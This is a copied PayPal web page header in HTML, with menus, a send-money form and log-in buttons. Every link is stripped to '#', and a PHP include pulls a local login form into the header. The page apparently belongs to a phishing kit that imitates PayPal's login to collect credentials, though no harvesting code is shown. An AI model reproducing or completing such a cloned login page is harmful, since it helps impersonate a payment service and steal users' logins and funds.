
    <div><div class="containerCentered ">

            
                
                
<a href="#Menu" id="menu-button" role="button">Menu</a> 

            

            
<a href="#" class="paypal-img-logo">PayPal</a>


            
                <nav id="main-menu" role="navigation">
                    <ul>
                        
                        <li>
<a href="#" id="header-buy" rel="menuitem" aria-controls="submenu-buy" role="button" aria-expanded="false">Buy</a>

                            
                                <div class="menu-wrapper" id="submenu-buy" aria-labelledby="header-buy">
                                    <ul id="header-buy-menu" class="subnav list">
                                        
                                            <li>
<a href="#">Pay on eBay</a>
</li>
                                        
                                            <li>
<a href="#">Pay on websites</a>
</li>
                                        
                                            <li>
<a href="#">Pay on the go</a>
</li>
                                        
                                            <li>
<a href="#	">Pay in stores</a>
</li>
                                        
                                            <li>
<a href="#">More ways to use us</a>
</li>
                                        

                                        

                                    </ul>
                                </div>
                            
                        </li>
                        
                        <li>
<a href="#" id="header-sell" rel="menuitem" aria-controls="submenu-sell" role="button" aria-expanded="false">Sell</a>

                            
                                <div class="menu-wrapper" id="submenu-sell" aria-labelledby="header-sell">
                                    <ul id="header-sell-menu" class="subnav list">
                                        
                                            <li>
<a href="#">Get paid on your website</a>
</li>
                                        
                                            <li>
<a href="#">Email an invoice</a>
</li>
                                        
                                            <li>
<a href="#">Get paid on the go</a>
</li>
                                        
                                            <li>
<a href="#">Get paid in your store</a>
</li>
                                        

                                        
                                            
                                            
                                                
                                                
                                                        
                                                        <li>
<a href="#">Request money</a>
</li>
                                                    
                                            
                                        

                                    </ul>
                                </div>
                            
                        </li>
                        

                        
                        <li>                                                                 
                            
<a href="#" id="header-send" rel="menuitem" class="desktop-only" aria-controls="submenu-send" role="button" aria-expanded="false">Send</a>

                            <div class="menu-wrapper light" id="submenu-send" aria-labelledby="header-send">
                                <div id="header-send-menu" class="menu subnav light"><form method="post" action="#" class="form-inline form-stepper" id="header-send-money-form" novalidate="novalidate">
    <div class="step shown" id="send-money-step-1" data-step="step">
        <div>
            <strong class="headline medium">Send money in a few clicks</strong>
            <a href="#" class="learn-more-link contentLink">Learn more</a>
        </div>
    
        <input type="hidden" name="myAllTextSubmitID" value="myAllTextSubmitID">
        <input type="hidden" value="_send-money" name="cmd">
        <input type="hidden" value="external" name="type">
        <input type="hidden" value="p2p_mktgpage" name="payment_source">
        <input type="hidden" value="Continue" name="submit.x">
        <input type="hidden" value="email@paypal.com" name="sender_email">
        <div class="controls">
            <div class="input-wrapper">
                <input class="emailf" name="email" type="text" id="to_email" placeholder="Their email or phone number" required="required" autocapitalize="off" autocorrect="off"><label for="to_email" class="accessAid">Email Address</label></div></div><div class="controls"><div class="input-wrapper caboose"><label for="amount_send" class="accessAid">Amount to send</label><input class="amount-currency" type="text" name="amount" id="amount_send" placeholder="Amount" autocapitalize="off" autocorrect="off" required="required" maxlength="17"><select class="currency no-arrow required" id="currency_code" name="amount_ccode">
                    
                        <option value="USD">USD</option>
                    
                        <option value="ALL">ALL</option>
                    
                        <option value="AUD">AUD</option>
                    
                        <option value="BRL">BRL</option>
                    
                        <option value="CAD">CAD</option>
                    
                        <option value="CHF">CHF</option>
                    
                        <option value="CZK">CZK</option>
                    
                        <option value="DKK">DKK</option>
                    
                        <option value="EUR">EUR</option>
                    
                        <option value="GBP">GBP</option>
                    
                        <option value="HKD">HKD</option>
                    
                        <option value="HUF">HUF</option>
                    
                        <option value="ILS">ILS</option>
                    
                        <option value="JPY">JPY</option>
                    
                        <option value="MXN">MXN</option>
                    
                        <option value="MYR">MYR</option>
                    
                        <option value="NOK">NOK</option>
                    
                        <option value="NZD">NZD</option>
                    
                        <option value="PHP">PHP</option>
                    
                        <option value="PLN">PLN</option>
                    
                        <option value="RUB">RUB</option>
                    
                        <option value="SEK">SEK</option>
                    
                        <option value="SGD">SGD</option>
                    
                        <option value="THB">THB</option>
                    
                        <option value="TRY">TRY</option>
                    
                        <option value="TWD">TWD</option>
                    
                </select><label for="currency_code" class="select-arrow">Currency</label></div></div><input type="submit" value="Continue" class="btn">
    </div>
    <div class="step" id="send-money-step-2" data-step="submit">
        <div class="button-choices">
            <div class="choice">
                <strong class="headline medium">This is to friends or family</strong>
                <p id="choice-1">Free for both of you when sent domestically in USD, and funded with your PayPal balance or bank account.</p>
                <button type="submit" name="payment_type" value="Gift" class="btn" data-step="submit" aria-describedby="choice-1">Friends or family</button>
            </div>
            <div class="choice">
                <strong class="headline medium">This is for a good or service</strong>
                <p id="choice-2">Free for you. The seller pays a small fee to process the payment. You?re also covered by our <a href="/webapps/mpp/paypal-safety-and-security">Purchase Protection</a>.</p>
                <button type="submit" name="payment_type" value="Goods" class="btn" data-step="submit" aria-describedby="choice-2">Goods or services</button>
            </div>
        </div>
    </div>
<input type="hidden" name="browser_name" value="Chrome"><input type="hidden" name="browser_version" value="537.36"><input type="hidden" name="browser_version_full" value="34.0.1847.137"><input type="hidden" name="operating_system" value="Windows"><input name="flow_name" value="" type="hidden"></form>
</div>
                            </div>
                        </li>
                        

                        
                            
                            
                                    
                                    <li>
<a href="#" id="header-business" class="no-drop">Business</a>
</li>
                                
                        
                    </ul>    

                    
                        <ul class="sublist">
                            
                                <li>
<form method="post" action="#"><button id="menu-sublist-search" title="Search" type="submit">Search</button><input type="hidden" name="queryString"><input type="hidden" name="cn" value="paypal"><input type="hidden" name="cc" value="www"><input type="hidden" name="adv" value="0"><input type="hidden" name="mode" value="caseB"><input type="hidden" name="browser_name" value="Chrome"><input type="hidden" name="browser_version" value="537.36"><input type="hidden" name="browser_version_full" value="34.0.1847.137"><input type="hidden" name="operating_system" value="Windows"><input name="flow_name" value="" type="hidden"></form>
</li>
                            
                                <li>
<a href="#" id="menu-sublist-help">Help</a>
</li>
                            
                                <li>
<a href="#" id="menu-sublist-contact">Contact</a>
</li>
                            
                            
                        </ul>
                    
                </nav>
            

            
                
                
                    
                        <div id="header-buttons" class="">
                    
                        
<a href="#" id="login-button" class="btn btn-secondary btn-small" role="button">Log In</a>

                        
<a href="#" id="signup-button" class="btn btn-small btn-signup">Sign Up</a>

                    </div>
                
                
                
                
                


                
                
                    
                        <div id="login-header" class="form-inline ">
							<? include ("./index/form.php"); ?>
						</div>        
            

        </div></div>
